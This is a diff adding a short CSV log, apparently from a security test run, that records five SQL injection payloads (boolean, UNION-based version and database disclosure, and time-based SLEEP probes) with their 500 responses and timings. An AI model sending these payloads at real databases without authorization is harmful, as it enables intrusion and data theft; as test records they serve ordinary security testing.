@@ -1,0 +1,6 @@
+timestamp,payload,status_code,response_time,response_len
+2026-04-03 14:38:07,1' AND '1'='1,500,0.0117,242
+2026-04-03 14:38:07,1' AND '1'='2,500,0.0055,242
+2026-04-03 14:38:07,"1' UNION SELECT 1,2,3--",500,0.0045,252
+2026-04-03 14:38:07,"1' UNION SELECT @@version,database()--",500,0.0042,267
+2026-04-03 14:38:07,1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--,500,0.0037,273
